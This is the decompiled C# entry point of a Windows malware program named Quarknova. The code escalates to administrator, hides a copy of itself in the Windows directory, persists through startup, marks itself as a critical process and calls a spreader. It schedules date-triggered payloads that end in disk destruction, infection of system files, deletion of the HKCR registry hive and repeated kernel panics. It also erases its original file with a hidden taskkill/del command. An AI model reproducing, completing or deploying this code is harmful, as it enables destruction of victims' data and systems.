using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Quarknova.Destructive;
using Quarknova.Main;
using Quarknova.Properties;
using Quarknova.Utilities;

namespace Quarknova
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			Thread.Sleep(1000);
			int num = 0;
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					if (process.MainModule.FileName.ToLower() == Path.GetPathRoot(Path.GetTempPath()).ToLower() + "windows\\quarknova.exe")
					{
						num++;
					}
				}
				catch
				{
				}
			}
			if (num > 1)
			{
				return;
			}
			if (!Functions.IsAdministrator())
			{
				ProcessStartInfo startInfo2 = new ProcessStartInfo
				{
					FileName = Assembly.GetEntryAssembly().Location,
					Arguments = string.Join(" ", args),
					Verb = "runas"
				};
				try
				{
					Process.Start(startInfo2);
				}
				catch
				{
				}
				return;
			}
			bool flag;
			Imports.RtlAdjustPrivilege(19, true, false, out flag);
			IntPtr zero = IntPtr.Zero;
			Imports.Wow64DisableWow64FsRedirection(ref zero);
			Payloads.Initialize();
			string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
			ProcessStartInfo startInfo;
			if (args.Length != 0)
			{
				if (args[0] == "-startuproutine")
				{
					if (!(directoryName.ToLower() == Path.GetPathRoot(directoryName).ToLower() + "windows"))
					{
						Payloads.StartPayload(new Action(Payloads.ExecSystem32), -1);
						Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
						Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
						Payloads.StartPayload(new Action(Payloads.WindowCorruptor), 100);
						Payloads.StartPayload(new Action(Payloads.RandHardError), 50);
						Payloads.StartPayload(new Action(Payloads.WindowOpacity), -1);
						Payloads.MoveWindow();
						Thread.Sleep(-1);
					}
					else
					{
						Thread.Sleep(1000);
						Spreader.Execute();
						if (Directory.Exists(Path.GetPathRoot(directoryName) + "windows\\quarknova"))
						{
							Payloads.QuarknovaDirectory = new DirectoryInfo(Path.GetPathRoot(directoryName) + "windows\\quarknova");
						}
						else
						{
							Payloads.QuarknovaDirectory = Directory.CreateDirectory(Path.GetPathRoot(directoryName) + "windows\\quarknova");
						}
						Functions.HideDirectory(Payloads.QuarknovaDirectory);
						Payloads.StartPayload(new Action(Payloads.SetCritical), 100);
						Startup.AddToStartup();
						Thread.Sleep(1000);
						Startup.EnsureStartupLoop();
						for (;;)
						{
							Payloads.CheckDate(delegate
							{
								Payloads.StartPayload(new Action(Payloads.SquishScreen), 1);
								Payloads.StartPayload(new Action(Payloads.FillQuark), 500);
								Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
								Payloads.StartPayload(new Action(Payloads.WindowOpacity), -1);
							}, 1, 1, DateTime.Now.Year, true, true);
							Payloads.CheckDate(delegate
							{
								Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
								Payloads.StartPayload(new Action(Payloads.ScreenDisplacement), 1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.WindowsSounds), 400);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.ColorBrush), 1);
								Payloads.StartPayload(new Action(Payloads.RandHardError), 1000);
							}, 1, 4, DateTime.Now.Year, true, true);
							Payloads.CheckDate(delegate
							{
								Payloads.ScreenWave();
								Payloads.StartPayload(new Action(Payloads.ScreenColor), 500);
								Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
								Thread.Sleep(1000);
								Payloads.StartPayload(new Action(Payloads.WindowCorruptor), 50);
								Payloads.StartPayload(new Action(Payloads.ExpandWindows), -1);
								Payloads.IconExplosion();
							}, 20, 4, DateTime.Now.Year, false, true);
							Payloads.CheckDate(delegate
							{
								Payloads.StartPayload(new Action(Payloads.NepotonodIcons), -1);
								Payloads.StartPayload(new Action(Payloads.NepotonodEarthquake), 1);
								Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
								Thread.Sleep(1000);
								Payloads.StartPayload(new Action(Payloads.RandScreenshots), 100);
							}, 26, 9, DateTime.Now.Year, true, true);
							Payloads.CheckDate(delegate
							{
								Payloads.StartPayload(new Action(Payloads.RandomKey), 50);
								Payloads.StartPayload(new Action(Payloads.ScreenFuzzifier), 100);
								Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
								Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
								Thread.Sleep(1000);
								Payloads.StartPayload(new Action(Payloads.RandScreenshots), 100);
							}, 21, 11, DateTime.Now.Year, true, true);
							Payloads.CheckDate(delegate
							{
								Payloads.StartPayload(new Action(DiskDestroyer.Execute), -1);
								Payloads.InfectSystemFiles();
								for (int j = 1; j < 51; j++)
								{
									File.WriteAllBytes(string.Format("{0}\\{1}.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop), j), new byte[0]);
								}
								Payloads.WriteNote();
								startInfo = new ProcessStartInfo
								{
									FileName = "reg.exe",
									Arguments = "delete HKCR /f",
									Verb = "runas",
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true
								};
								Process.Start(startInfo);
								Thread.Sleep(30000);
								Payloads.StartPayload(new Action(Payloads.TimeMachine), -1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.IconExplosion), -1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.WindowsSounds), 400);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.ScreenColor), 500);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.FillQuark), 500);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.ScreenDisplacement), 1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.TextToSpeech), 1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.ColorBrush), 1);
								Thread.Sleep(2500);
								Payloads.StartPayload(new Action(Payloads.EnableRotation), -1);
								Thread.Sleep(5000);
								Payloads.StartPayload(new Action(Payloads.RotateScreen), -1);
								Thread.Sleep(2500);
								Payloads.StartPayload(new Action(Payloads.ScreenFuzzifier), 100);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.WindowOpacity), -1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.RandomKey), 1000);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.JitterCursor), 10);
								Payloads.StartPayload(new Action(Payloads.CursorSquare), 10);
								Thread.Sleep(8000);
								Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
								Thread.Sleep(1000);
								Payloads.StartPayload(new Action(Payloads.WindowCorruptor), 250);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.ExpandWindows), -1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.RandScreenshots), 100);
								Thread.Sleep(5000);
								for (int k = 0; k < 5; k++)
								{
									Payloads.StartPayload(new Action(Payloads.Checkerboard), 1);
								}
								Thread.Sleep(5000);
								Payloads.DoRandRops = true;
								Thread.Sleep(5000);
								Payloads.StartPayload(new Action(Payloads.SquishScreen), 1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.Stretch), 1000);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.MoveWindow), -1);
								Thread.Sleep(10000);
								Payloads.StartPayload(new Action(Payloads.RandHardError), 50);
								Thread.Sleep(10000);
								for (;;)
								{
									Payloads.KernelPanic();
								}
							}, 25, 12, DateTime.Now.Year, false, false);
							Thread.Sleep(1000);
						}
					}
				}
				else if (directoryName.ToLower() == Path.GetPathRoot(directoryName).ToLower() + "windows")
				{
					Payloads.StartPayload(new Action(Payloads.ExecSystem32), -1);
					Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
					Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
					Payloads.StartPayload(new Action(Payloads.WindowCorruptor), 100);
					Payloads.StartPayload(new Action(Payloads.RandHardError), 50);
					Payloads.StartPayload(new Action(Payloads.WindowOpacity), -1);
					Payloads.MoveWindow();
					Thread.Sleep(-1);
				}
			}
			else if (directoryName.ToLower() == Path.GetPathRoot(directoryName).ToLower() + "windows")
			{
				Payloads.StartPayload(new Action(Payloads.ExecSystem32), -1);
				Payloads.StartPayload(new Action(Payloads.ScreenBits), 1);
				Payloads.StartPayload(new Action(Payloads.UpdateProcs), 1000);
				Payloads.StartPayload(new Action(Payloads.WindowCorruptor), 100);
				Payloads.StartPayload(new Action(Payloads.RandHardError), 50);
				Payloads.StartPayload(new Action(Payloads.WindowOpacity), -1);
				Payloads.MoveWindow();
				Thread.Sleep(-1);
			}
			string text = Path.GetPathRoot(directoryName) + "windows\\quarknova.exe";
			try
			{
				File.WriteAllBytes(Path.GetPathRoot(directoryName) + "windows\\Microsoft.Win32.TaskScheduler.dll", Resources.Microsoft_Win32_TaskScheduler);
				Functions.HideFile(Path.GetPathRoot(directoryName) + "windows\\Microsoft.Win32.TaskScheduler.dll");
				File.WriteAllBytes(Path.GetPathRoot(directoryName) + "windows\\NAudio.dll", Resources.NAudio);
				Functions.HideFile(Path.GetPathRoot(directoryName) + "windows\\NAudio.dll");
			}
			catch
			{
			}
			if (File.Exists(text))
			{
				Process.Start(Path.GetPathRoot(directoryName) + "windows\\quarknova.exe", "-startuproutine");
				return;
			}
			File.Copy(Assembly.GetEntryAssembly().Location, text, true);
			Functions.HideFile(text);
			Thread.Sleep(1000);
			Process.Start(text, "-startuproutine");
			string str = string.Format("taskkill /f /pid {0} & del /f /q \"{1}\"", Process.GetCurrentProcess().Id, Assembly.GetEntryAssembly().Location);
			startInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c " + str,
				Verb = "runas",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			};
			Process.Start(startInfo);
		}
	}
}
